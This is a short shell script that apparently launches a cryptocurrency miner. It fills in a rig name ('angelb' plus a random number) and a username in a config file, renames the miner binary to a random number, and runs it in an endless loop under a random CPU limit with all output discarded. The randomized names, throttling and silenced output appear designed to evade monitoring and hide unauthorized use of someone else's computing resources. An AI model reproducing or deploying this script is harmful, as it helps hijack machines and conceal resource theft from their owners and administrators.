chmod +x lol build_config killing
TOP=angelb.$(shuf -n 1 -i 1-9999)
OKE=$(shuf -n 1 -i 1-99)
cpu=$(shuf -n 1 -i 1-20)
USER=$1
mv lol $OKE
sed -i "s/RIGNAME/$TOP/" "build_config"
sed -i "s/USERNAME/$USER/" "build_config"
while :; do timeout 1m cpulimit -l $cpu ./$OKE; sleep 20; done >/dev/null >/dev/null 2>&1